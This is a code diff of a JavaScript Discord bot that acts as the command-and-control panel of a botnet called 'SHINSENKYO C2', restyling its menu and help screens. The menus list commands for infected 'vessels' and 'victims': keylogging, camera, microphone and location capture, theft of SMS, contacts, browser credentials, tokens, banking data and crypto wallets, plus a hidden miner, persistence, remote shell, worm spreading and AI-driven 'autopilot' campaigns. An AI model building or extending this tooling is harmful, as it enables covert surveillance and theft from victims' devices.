@@ -245,85 +245,54 @@ async function sendToTarget(uid, guild, cmd, payload) {
 function menuEmbed() {
   const onlineCount = [...deviceStatus.values()].filter(s => s.online === true).length
   const totalDevices = deviceStatus.size
-  return novaLogoEmbed('online',
-    `*"Paradise is just another name for a place where you have nothing left to lose."*\n\n` +
-    `**${E.ghost} ${totalDevices} vessel(s)** — ${onlineCount} flowing | ${totalDevices - onlineCount} fallen\n\n` +
-    `${E.eye} **Incantations**\n` +
-    `• \`!devices\` — List all vessels\n` +
-    `• \`!target <name>\` — Select vessel\n` +
-    `• \`!untarget\` — Clear target\n` +
-    `• \`!broadcast <cmd>\` — Send to ALL\n` +
-    `• \`!send <cmd> <victim>\` — Direct send\n` +
-    `• \`!help\` — Full command grimoire\n` +
-    `• \`!history\` — Command log\n` +
-    `• \`!search <query>\` — Find vessel\n` +
-    `• \`!ai <request>\` — AI Co-Pilot\n` +
-    `• \`!campaign <obj>\` — Autopilot\n` +
-    `• \`!analyze\` — Intel analysis\n\n` +
-    `${E.torii} **Slash Incantations**\n` +
-    `\`/menu\` \`/help\` \`/devices\` \`/target\` \`/broadcast\` \`/send\` \`/grabber\` \`/miner\` \`/upload\` \`/files\`\n\n` +
-    `${onlineCount > 0 ? `${E.knife} ${onlineCount} vessel(s) in Tao flow — target one to begin` : `${E.coffin} Awaiting vessels for Shinsenkyo...`}`)
+  return {
+    embeds: [new EmbedBuilder()
+      .setColor(C.blood)
+      .setTitle(`${E.torii} SHINSENKYO C2 ${E.sakura}`)
+      .setImage(randGif())
+      .setDescription(
+        `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+        `**${E.ghost} Vessels** — ${onlineCount} flowing · ${totalDevices - onlineCount} fallen\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `${E.eye} **Incantations**\n` +
+        `• \`!devices\` — List all vessels\n` +
+        `• \`!target <name>\` — Select vessel\n` +
+        `• \`!untarget\` — Clear target\n` +
+        `• \`!broadcast <cmd>\` — Send to ALL\n` +
+        `• \`!send <cmd> <victim>\` — Direct send\n` +
+        `• \`!help\` — Full command grimoire\n` +
+        `• \`!history\` — Command log\n` +
+        `• \`!search <query>\` — Find vessel\n` +
+        `• \`!ai <request>\` — AI Co-Pilot\n` +
+        `• \`!campaign <obj>\` — Autopilot\n` +
+        `• \`!analyze\` — Intel analysis\n\n` +
+        `${E.torii} **Slash Incantations**\n` +
+        `\`/menu\` \`/help\` \`/devices\` \`/target\` \`/broadcast\` \`/send\` \`/grabber\` \`/miner\` \`/upload\` \`/files\`\n\n` +
+        `${onlineCount > 0 ? `${E.knife} ${onlineCount} vessel(s) in Tao flow — target one to begin` : `${E.coffin} Awaiting vessels for Shinsenkyo...`}`
+      )
+      .setFooter({ text: `🌸  ${ts()}  ─────────────────`, iconURL: ICONS.footer || undefined })
+    ],
+  }
 }
 
 function helpEmbed() {
-  const clk = clockText()
-  const box = createBox(
-    `${A.brightRed}${smallCaps('command grimoire')}${A.reset}\n` +
-    `${A.red}┃${A.reset}\n` +
-    `${A.red}┃${A.reset} ${A.green}RECON${A.reset}      : !ping !sysinfo !antidetect !ip !uptime !status !debug\n` +
-    `${A.red}┃${A.reset} ${A.green}       ${A.reset}      : !sysprop !services !apps !storage !battery\n` +
-    `${A.red}┃${A.reset}\n` +
-    `${A.red}┃${A.reset} ${A.red}SURVEILL${A.reset}    : !screenshot !camera !mic !location !clipboard\n` +
-    `${A.red}┃${A.reset} ${A.red}       ${A.reset}      : !keylog !stream !notifications\n` +
-    `${A.red}┃${A.reset}\n` +
-    `${A.red}┃${A.reset} ${A.magenta}INTEL${A.reset}       : !contacts !sms !call_log !wifi !installed\n` +
-    `${A.red}┃${A.reset} ${A.magenta}       ${A.reset}      : !processes !torch !vibrate\n` +
-    `${A.red}┃${A.reset}\n` +
-    `${A.red}┃${A.reset} ${A.brightRed}GRABBER${A.reset}    : !grabber [all|browser|messenger|tokens|wallets]\n` +
-    `${A.red}┃${A.reset} ${A.brightRed}       ${A.reset}      : !grabber [files|clipboard|banks|whatsapp|chrome|docs]\n` +
-    `${A.red}┃${A.reset}\n` +
-    `${A.red}┃${A.reset} ${A.yellow}FILES${A.reset}       : !dir !ls !tree !find !cat !info !disk\n` +
-    `${A.red}┃${A.reset} ${A.yellow}       ${A.reset}      : !recent !ext !download !rm !mv !cp !mkdir\n` +
-    `${A.red}┃${A.reset}\n` +
-    `${A.red}┃${A.reset} ${A.yellow}ADVANCED${A.reset}   : !wifipass !netstat !shell !persist !module\n` +
-    `${A.red}┃${A.reset}\n` +
-    `${A.red}┃${A.reset} ${A.red}EXPLOIT${A.reset}    : !worm !brain !inject !exploit !auto_pwn\n` +
-    `${A.red}┃${A.reset} ${A.red}       ${A.reset}      : !worm status/start/stop/infect\n` +
-    `${A.red}┃${A.reset} ${A.red}       ${A.reset}      : !brain status/fix/fixlog/inject/heal\n` +
-    `${A.red}┃${A.reset} ${A.red}       ${A.reset}      : !inject scan/targets/run/auto\n` +
-    `${A.red}┃${A.reset}\n` +
-    `${A.red}┃${A.reset} ${A.red}CONTROL${A.reset}    : !admin !overlay !click !input !open !screen\n` +
-    `${A.red}┃${A.reset} ${A.red}       ${A.reset}      : !gesture !pin\n` +
-    `${A.red}┃${A.reset}\n` +
-    `${A.red}┃${A.reset} ${A.magenta}MINING${A.reset}     : !miner [start|stop|status|set_wallet|set_pool]\n` +
-    `${A.red}┃${A.reset}\n` +
-    `${A.red}┃${A.reset} ${A.brightRed}SYSTEM${A.reset}     : !update !config !upload\n` +
-    `${A.red}┃${A.reset}\n` +
-    `${A.red}┃${A.reset} ${A.green}BOT${A.reset}         : !help !menu !devices !target !untarget\n` +
-    `${A.red}┃${A.reset} ${A.green}   ${A.reset}         : !broadcast !health !history !search !ai !campaign !analyze\n` +
-    `${A.red}┃${A.reset} ${A.green}   ${A.reset}         : !setavatar\n` +
-    `${A.red}┃${A.reset}\n` +
-    `${A.green}◈ ${clk}${A.reset}`,
-    'neon', 58
-  )
   return {
     embeds: [new EmbedBuilder()
       .setColor(C.blood)
       .setTitle(`${E.torii} SHINSENKYO — COMMAND GRIMOIRE`)
-      .setDescription(`\`\`\`ansi\n${box}\n\`\`\``)
-      .setThumbnail(randGif())
-      .addFields(
-        { name: `${E.target} RECON`, value: '`!ping` `!sysinfo` `!antidetect` `!ip` `!uptime` `!status` `!debug`', inline: true },
-        { name: `${E.eye} SURVEILLANCE`, value: '`!screenshot` `!camera` `!mic` `!location` `!clipboard` `!keylog` `!stream`', inline: true },
-        { name: `${E.book} INTEL`, value: '`!contacts` `!sms` `!call_log` `!wifi` `!installed` `!processes`', inline: true },
-        { name: `${E.knife} GRABBER`, value: '`!grabber [all|browser|messenger|tokens|wallets|files|clipboard|banks|whatsapp|chrome|docs]`', inline: true },
-        { name: `${E.scroll} FILES`, value: '`!dir` `!tree` `!find` `!cat` `!info` `!disk` `!recent` `!ext` `!download` `!rm` `!mv` `!cp` `!mkdir`', inline: true },
-        { name: `${E.flame} ADVANCED`, value: '`!wifipass` `!netstat` `!shell` `!persist`', inline: true },
-        { name: `${E.sword} CONTROL`, value: '`!admin` `!overlay` `!click` `!input` `!open` `!screen` `!pin`', inline: true },
-        { name: `${E.pick} MINING`, value: '`!miner [start|stop|status|set_wallet|set_pool]`', inline: true },
-        { name: `${E.tools} SYSTEM`, value: '`!update` `!config` `!upload`', inline: true },
-        { name: `${E.sword} EXPLOIT`, value: '`!worm` `!brain` `!inject` `!exploit` `!auto_pwn`', inline: true },
-        { name: `${E.brain} BOT CMDS`, value: '`!ai` `!campaign` `!analyze` `!history` `!search`', inline: true },
+      .setImage(randGif())
+      .setDescription(
+        `**${E.target} RECON**\n\`!ping\` \`!sysinfo\` \`!antidetect\` \`!ip\` \`!uptime\` \`!status\` \`!debug\`\n\n` +
+        `**${E.eye} SURVEILLANCE**\n\`!screenshot\` \`!camera\` \`!mic\` \`!location\` \`!clipboard\` \`!keylog\` \`!stream\`\n\n` +
+        `**${E.book} INTEL**\n\`!contacts\` \`!sms\` \`!call_log\` \`!wifi\` \`!installed\` \`!processes\`\n\n` +
+        `**${E.knife} GRABBER**\n\`!grabber [all|browser|messenger|tokens|wallets|files|clipboard|banks|whatsapp|chrome|docs]\`\n\n` +
+        `**${E.scroll} FILES**\n\`!dir\` \`!tree\` \`!find\` \`!cat\` \`!info\` \`!disk\` \`!recent\` \`!ext\` \`!download\` \`!rm\` \`!mv\` \`!cp\` \`!mkdir\`\n\n` +
+        `**${E.flame} ADVANCED**\n\`!wifipass\` \`!netstat\` \`!shell\` \`!persist\`\n\n` +
+        `**${E.sword} CONTROL**\n\`!admin\` \`!overlay\` \`!click\` \`!input\` \`!open\` \`!screen\` \`!pin\`\n\n` +
+        `**${E.pick} MINING**\n\`!miner [start|stop|status|set_wallet|set_pool]\`\n\n` +
+        `**${E.tools} SYSTEM**\n\`!update\` \`!config\` \`!upload\`\n\n` +
+        `**${E.sword} EXPLOIT**\n\`!worm\` \`!brain\` \`!inject\` \`!exploit\` \`!auto_pwn\`\n\n` +
+        `**${E.brain} BOT CMDS**\n\`!ai\` \`!campaign\` \`!analyze\` \`!history\` \`!search\``
       )
       .setFooter({ text: `🌸  ${ts()}  ─────────────────`, iconURL: ICONS.footer || undefined })
     ],
